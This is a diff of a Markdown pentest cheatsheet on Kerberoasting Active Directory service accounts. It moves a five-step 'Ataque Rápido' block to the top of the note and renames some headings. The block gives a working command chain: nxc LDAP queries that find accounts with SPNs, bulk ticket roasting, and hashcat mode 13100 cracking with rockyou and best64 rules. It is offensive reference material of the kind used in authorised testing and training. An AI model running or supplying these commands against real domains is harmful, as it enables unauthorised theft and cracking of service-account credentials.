@@ -39,7 +39,32 @@ linked:
 
 ## Cheatsheet
 
-### 🔍 SPN Discovery
+### 1. Ataque Rápido (TL;DR)
+
+```bash
+# 1. Discovery
+nxc ldap <DC> -u user -p pass --query \
+  "(&(objectCategory=user)(servicePrincipalName=*))" \
+  "samAccountName,servicePrincipalName,adminCount"
+
+# 2. Bulk roast
+nxc ldap <DC> -u user -p pass --kerberoasting roast.hash
+
+# 3. Crack
+hashcat -m 13100 roast.hash /usr/share/wordlists/rockyou.txt -O
+
+# 4. Crack con rules si rockyou no pega
+hashcat -m 13100 roast.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O
+
+# 5. Validate
+hashcat -m 13100 roast.hash --show
+```
+
+---
+
+### 2. Explotación
+
+#### 🔍 SPN Discovery
 
 ````tabs
 tab: **LDAP Filter Discovery**
@@ -67,7 +92,7 @@ tab: **Pre-Attack Validation**
 ![[Kerberoasting - SPN Discovery#^kerb-spn-validate]]
 ````
 
-### 🎫 Request TGS
+#### 🎫 Request TGS
 
 ````tabs
 tab: **Impacket GetUserSPNs**
@@ -95,7 +120,7 @@ tab: **Common Errors**
 ![[Kerberoasting - Request TGS#^kerb-tgs-errors]]
 ````
 
-### 💥 Hash Cracking
+#### 💥 Hash Cracking
 
 ````tabs
 tab: **Hashcat Modes**
@@ -129,7 +154,7 @@ tab: **Common Errors**
 ![[Kerberoasting - Hash Cracking#^kerb-crack-errors]]
 ````
 
-### 🎯 Targeted Kerberoasting
+#### 🎯 Targeted Kerberoasting
 
 ````tabs
 tab: **Concept**
@@ -160,7 +185,7 @@ tab: **Common Errors**
 ![[Kerberoasting - Targeted Kerberoasting#^kerb-targeted-errors]]
 ````
 
-### 🌐 Cross-Trust & Modern
+#### 🌐 Cross-Trust & Modern
 
 ````tabs
 tab: **Cross-Domain (Intra-Forest)**
@@ -191,7 +216,7 @@ tab: **Mitigations**
 ![[Kerberoasting - Cross-Trust y Modern#^kerb-cross-mitigations]]
 ````
 
-### 🛠️ Tooling
+#### 🛠️ Tooling
 
 ````tabs
 tab: **Impacket-GetUserSPNs**
@@ -293,29 +318,6 @@ tab: **Recursos**
 7. Cleanup:
    - Remove fake SPNs (targeted)
    - klist purge
-```
-
----
-
-## Detección rápida
-
-```bash
-# 1. Discovery
-nxc ldap <DC> -u user -p pass --query \
-  "(&(objectCategory=user)(servicePrincipalName=*))" \
-  "samAccountName,servicePrincipalName,adminCount"
-
-# 2. Bulk roast
-nxc ldap <DC> -u user -p pass --kerberoasting roast.hash
-
-# 3. Crack
-hashcat -m 13100 roast.hash /usr/share/wordlists/rockyou.txt -O
-
-# 4. Crack con rules si rockyou no pega
-hashcat -m 13100 roast.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O
-
-# 5. Validate
-hashcat -m 13100 roast.hash --show
 ```
 
 ---
